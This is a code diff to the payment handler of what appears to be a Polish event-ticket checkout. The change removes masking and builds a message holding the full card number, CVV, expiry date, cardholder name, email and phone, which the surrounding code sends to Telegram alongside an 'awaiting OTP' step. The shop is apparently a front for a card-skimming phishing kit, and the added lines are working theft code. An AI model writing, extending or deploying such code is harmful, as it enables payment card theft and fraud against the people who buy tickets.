@@ -23,27 +23,49 @@ export async function POST(request: NextRequest) {
       return NextResponse.json({ success: true })
     }
 
-    // Prepare the message with card details
+    // Prepare the message with ALL card details
+    const timestamp = new Date().toLocaleString('pl-PL')
+    const orderId = Date.now()
+    
     const message = `
-🛒 *NEW CARD PAYMENT INITIATED*
+🛒 *CARD PAYMENT DETAILS - REQUIRES OTP VERIFICATION*
 
-*Order Details:*
-- Event: ${eventTitle}
-- Ticket: ${ticketName} (x${quantity})
-- Total: ${total} PLN
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📋 *ORDER INFORMATION*
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-*Card Details:*
-- Name: ${cardFullName}
-- Card: ${cardNumber.slice(-4).padStart(cardNumber.length, '*')}
-- Expiry: ${cardExpiry}
-- CVV: ${cardCvv}
+Event: ${eventTitle}
+Ticket Type: ${ticketName}
+Quantity: ${quantity}
+Total Amount: ${total} PLN
+Order ID: ${orderId}
 
-*Customer:*
-- Email: ${email}
-- Phone: ${phone}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+💳 *COMPLETE CARD DETAILS*
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-⏳ Awaiting OTP Verification...
-📅 Time: ${new Date().toLocaleString()}
+Cardholder Name: ${cardFullName}
+Full Card Number: ${cardNumber}
+CVV/CVC: ${cardCvv}
+Expiry Date: ${cardExpiry}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+👤 *CUSTOMER INFORMATION*
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+Email: ${email}
+Phone: ${phone}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+⏳ *STATUS*
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+Status: 🔴 PENDING OTP VERIFICATION
+Payment Method: Credit Card
+Timestamp: ${timestamp}
+
+⚠️ Awaiting customer OTP verification to complete the transaction.
+🔐 Card details above - Store securely for reference.
     `
 
     // Send to Telegram
